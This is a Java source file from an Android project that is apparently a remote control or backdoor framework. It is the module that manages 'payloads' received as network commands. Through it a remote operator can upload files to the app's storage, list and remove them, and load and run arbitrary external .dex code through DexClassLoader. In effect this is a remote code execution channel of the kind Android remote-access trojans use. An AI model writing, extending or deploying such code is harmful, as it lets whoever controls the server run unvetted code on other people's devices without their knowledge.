package com.core.payloads;

import android.app.Activity;

import com.corelib.IPayload;
import com.corelib.Packet;
import com.core.ServerThread;

import java.io.File;

import dalvik.system.DexClassLoader;

/**
 * Payloads class
 * Created by hkff on 4/24/15.
 */
public class Payloads implements IPayload {

    //-----------------------------------------------------------//
    public enum Commands {
        GETPAYLOADS,
        GETEXTPAYLOADS,
        ADDPAYLOAD,
        REMOVEPAYLOAD,
        LOADEXTPAYLOAD,
        LOADPAYLOAD,
        DISABLEPAYLOAD,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp;

        // We handle the command
        switch (cmd){
            // List all loaded payloads
            case GETPAYLOADS:
                result.setMsg("Loaded payloads : ");
                result.setContent(this.getLoadedPayloads().getBytes());
                break;

            // List all external payloads
            case GETEXTPAYLOADS:
                result.setMsg("External payloads : ");
                result.setContent(this.getExtPayloads().getBytes());
                break;

            // Load a payload
            // Protocol : LOADPAYLOAD:name
            case LOADPAYLOAD:
                tmp = new String(msg.getContent()).split(":");
                String lname = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.loadPayload(lname));
                break;

            // Disable a payload
            // Protocol : DISABLEPAYLOAD:name
            case DISABLEPAYLOAD:
                tmp = new String(msg.getContent()).split(":");
                String dname = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.disablePayload(dname));
                break;

            // Add a payload
            // Protocol : ADDPAYLOAD:name
            case ADDPAYLOAD:
                String aname = (msg.getExtras().size() > 0)? msg.getExtras().get(0) : "";
                result.setMsg(this.addPayload(aname, msg.getContent()));
                break;

            // Remove a payload
            // Protocol : REMOVEPAYLOAD:name
            case REMOVEPAYLOAD:
                tmp = new String(msg.getContent()).split(":");
                String rname = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.removePayload(rname));
                break;

            // Load a payload from an external dex file
            // Protocol : LOADEXTPAYLOAD:name
            case LOADEXTPAYLOAD:
                tmp = new String(msg.getContent()).split(":");
                String exname = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.loadExternalPayload(exname));
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//


    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Payloads(){}

    /**
     * Constructor
     * @param app
     */
    public Payloads(Activity app){
        this.app = app;
    }


    /**
     * List all loaded payloads
     * @return
     */
    public String getLoadedPayloads() {
        String result = "";
        for(IPayload p : ServerThread.getPayloads()) {
            result += "\n - " + p.getClass().getSimpleName();
        }
        return result;
    }

    /**
     * List all external payloads
     * @return
     */
    public String getExtPayloads() {
        return Files.listDir(this.app.getFilesDir().toString());
    }


    /**
     * Load a payload
     * @return
     */
    public String loadPayload(String name) {
        String result = "Payload loaded !";

        // Check if the payload is already loaded
        for(IPayload p : ServerThread.getPayloads()) {
            if(p.getClass().getSimpleName().equals(name)){
                result = "Payload already loaded !";
                return result;
            }
        }

        try {
            Class cipayload = Class.forName(Payloads.class.getPackage().getName() + "." + name);
            IPayload payload = (IPayload) cipayload.newInstance();
            payload.setApp(this.app);
            ServerThread.addPayload(payload);
        } catch (Exception e) {
            e.printStackTrace();
            result = e.getMessage();
        }
        return result;
    }

    /**
     * Disable a payload
     * @return
     */
    public String disablePayload(String name) {
        String result = "Payload not found !";

        for(IPayload p : ServerThread.getPayloads()) {
            if(p.getClass().getSimpleName().equals(name)){
                ServerThread.removePayload(p);
                result = "Payload disabled !";
                break;
            }
        }
        return result;
    }

    /**
     * Add a payload
     * @return
     */
    public String addPayload(String name, byte[] payload) {
        return Files.writeFile(payload, this.app.getFilesDir().toString() + "/" + name);
    }

    /**
     * Remove a payload
     * @return
     */
    public String removePayload(String name) {
        return Files.removeFile(this.app.getFilesDir().toString() + "/" + name + ".jar");
    }

    /**
     * Load an external payload from a dex file
     * @return
     */
    public String loadExternalPayload(String name) {
        String result = "Payload loaded !";

        // Check if the payload is already loaded
        for(IPayload p : ServerThread.getPayloads()) {
            if(p.getClass().getSimpleName().equals(name)){
                result = "Payload already loaded !";
                return result;
            }
        }

        // Try to load from external dex file
        try {
            String dexFile = name + ".dex";
            File f = new File(this.app.getFilesDir().toString(), dexFile);
            final File optimizedDexOutputPath = new File(this.app.getFilesDir().toString() + "/optdex");
            if(!optimizedDexOutputPath.exists())
                optimizedDexOutputPath.mkdir();

            DexClassLoader classLoader = new DexClassLoader(f.getAbsolutePath(),
                    optimizedDexOutputPath.getAbsolutePath(), null, this.app.getClassLoader());

            String completeClassName =  Payloads.class.getPackage().getName() + "." + name;
            Class<?> cipayload = classLoader.loadClass(completeClassName);
            IPayload payload = (IPayload) cipayload.newInstance();
            payload.setApp(this.app);
            ServerThread.addPayload(payload);

        } catch (Exception e) {
            e.printStackTrace();
            result = e.getMessage();
        }
        return result;
    }

}
